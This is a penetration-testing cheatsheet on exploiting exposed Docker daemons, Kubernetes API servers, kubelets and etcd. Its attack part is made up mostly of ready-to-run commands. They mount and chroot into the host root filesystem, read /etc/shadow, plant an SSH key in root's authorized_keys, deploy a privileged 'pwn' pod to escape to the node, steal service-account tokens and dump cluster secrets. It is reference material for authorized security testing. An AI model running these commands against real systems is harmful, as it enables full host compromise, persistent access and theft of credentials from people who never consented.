---
tags: [pentest, cheatsheet, docker, kubernetes, k8s, container, service, both, linux]
port: [2375, 2376, 6443, 8443, 10250, 10255]
phase: reference
---
# Container APIs — Docker / Kubernetes (2375 / 6443 / 10250)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Container orchestration APIs were not designed to be exposed to anything but a private management network. When you see one of these ports open externally — or internally with no auth — the **fastest path from "I scanned a port" to "I am root on the host"** is right here. Skip everything else and try the API.

| Port | Service | Auth default | Win condition |
| ---: | --- | --- | --- |
| 2375 | Docker daemon (HTTP, no TLS) | **None** | Create a container with `-v /:/host` → chroot to host filesystem as root |
| 2376 | Docker daemon (HTTPS) | mTLS | Same as 2375 if you steal client certs |
| 6443 | Kubernetes API server | TLS + RBAC | Anonymous access enabled? `system:anonymous` with view = recon; with create = pwned |
| 8443 | K8s API (alt) | Same as 6443 | Same |
| 10250 | Kubelet API on each node | TLS, may allow anonymous | Anonymous `exec` into any pod on that node |
| 10255 | Kubelet read-only (legacy) | None | Disclosure of pod specs, env vars (often contain secrets) |

**The classic pwn:** Docker API on 2375 with no TLS = unauthenticated container creation = `docker run -v /:/host alpine chroot /host`. Game over for the host.

## Docker API (2375 / 2376)

### Detect

```bash
curl -s http://$IP:2375/version
curl -s http://$IP:2375/info | jq

# Or use the docker client directly
docker -H tcp://$IP:2375 info
docker -H tcp://$IP:2375 images
docker -H tcp://$IP:2375 ps -a
```

### Escape to host

```bash
# Mount the host's root filesystem inside a container, chroot into it
docker -H tcp://$IP:2375 run -v /:/host -it --rm alpine chroot /host /bin/bash

# Or one-shot read of /etc/shadow
docker -H tcp://$IP:2375 run --rm -v /:/host alpine cat /host/etc/shadow

# Drop SSH key onto host as root
docker -H tcp://$IP:2375 run --rm -v /root/.ssh:/root/.ssh alpine sh -c "echo 'ssh-ed25519 AAAA... me' >> /root/.ssh/authorized_keys"

# Privileged container with host PID & network
docker -H tcp://$IP:2375 run --rm -it --privileged --pid=host --net=host alpine sh
```

### Metasploit

```text
use exploit/linux/http/docker_daemon_tcp
```

## Kubernetes API server (6443 / 8443)

### Detect & probe anonymous access

```bash
# Server version (anonymous)
curl -sk https://$IP:6443/version

# What can system:anonymous do? (lots of clusters left this enabled)
curl -sk https://$IP:6443/api/v1/namespaces
curl -sk https://$IP:6443/api/v1/pods --all-namespaces
curl -sk https://$IP:6443/api/v1/secrets --all-namespaces
```

### With a stolen service-account token

Tokens are mounted into pods at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Once you have one:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# What can I do?
kubectl --token=$TOKEN --certificate-authority=$CA --server=https://$IP:6443 auth can-i --list

# List secrets in every namespace
kubectl --token=$TOKEN --certificate-authority=$CA --server=https://$IP:6443 get secrets -A
kubectl --token=$TOKEN --certificate-authority=$CA --server=https://$IP:6443 get secret <name> -o jsonpath='{.data.token}' | base64 -d
```

### RBAC misconfigs to look for

- `cluster-admin` bound to `system:authenticated` or `system:anonymous`.
- ServiceAccount with `create pods` → spawn a privileged pod mounting the host fs.
- ServiceAccount with `get secrets` → dump every token in the cluster.
- ServiceAccount with `escalate` or `bind` on ClusterRoles → privilege escalation to cluster-admin.

### Escape to node via pod

If you can create pods:

```yaml
# host-escape.yaml — mounts host root
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["sh", "-c", "sleep 1d"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

```bash
kubectl apply -f host-escape.yaml
kubectl exec -it pwn -- chroot /host /bin/bash
```

## Kubelet API (10250)

The kubelet is the per-node agent. If it allows `--anonymous-auth=true` (default on some installs), you can `exec` into pods on that node **without going through the API server's RBAC**.

```bash
# List pods on this node
curl -sk https://$IP:10250/pods | jq '.items[].metadata | .namespace + "/" + .name'

# Exec into a pod (token-free if anonymous enabled)
curl -sk -X POST "https://$IP:10250/run/<namespace>/<pod>/<container>" -d "cmd=id"

# kubeletctl automates all of this
git clone https://github.com/cyberark/kubeletctl
./kubeletctl pods -s $IP
./kubeletctl exec "id" -p <pod> -c <container> -s $IP
```

## Kubelet read-only (10255)

Legacy and disabled by default on modern installs, but when present:

```bash
curl -s http://$IP:10255/pods | jq               # full pod specs incl. env vars
curl -s http://$IP:10255/metrics                  # cluster metrics
curl -s http://$IP:10255/stats/summary
```

Environment variables in pod specs **routinely contain secrets** (DB passwords, API keys) that nobody remembered to move to a Secret object.

## Etcd (2379 / 2380)

If exposed without client-cert auth:

```bash
etcdctl --endpoints=https://$IP:2379 --insecure-skip-tls-verify get / --prefix --keys-only
# Etcd holds every Kubernetes Secret in cleartext (unless encryption-at-rest is configured)
```

## Quick triage script

```bash
for p in 2375 2376 6443 8443 10250 10255 2379; do
  echo "--- $IP:$p ---"
  curl -sk --max-time 3 https://$IP:$p/ | head -c 200
  curl -s  --max-time 3 http://$IP:$p/ | head -c 200
done
```

## Related

- [[../05 - Vulnerability Analysis/14 - Checkov IaC]] — IaC misconfig scanner
- [[../05 - Vulnerability Analysis/15 - tfsec]]
- [[../07 - Post-Exploitation/Linux/12 - Docker LXD Group Privesc]] — local Docker group escape
